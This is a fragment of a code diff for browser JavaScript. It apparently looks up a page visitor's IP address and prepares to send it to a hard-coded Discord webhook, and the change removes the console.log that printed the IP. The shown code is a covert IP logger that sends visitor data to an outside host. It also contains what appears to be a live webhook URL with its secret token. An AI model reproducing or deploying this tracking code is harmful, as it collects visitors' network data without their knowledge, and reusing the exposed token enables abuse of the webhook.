@@ -52,7 +52,6 @@
         ipRequest.onload = function() {
             if (ipRequest.status === 200) {
                 const data = JSON.parse(ipRequest.responseText);
-                console.log(data.ip);
     
                 const discordRequest = new XMLHttpRequest();
                 const webhookUrl = 'https://discord.com/api/webhooks/1169621875740135424/iBsnAb5E6MUNhP4iHFIIpZ_erAg4GuW-YwY6nUPYA3l4o448XqxLnR9L8qEGnl0CUkS2';
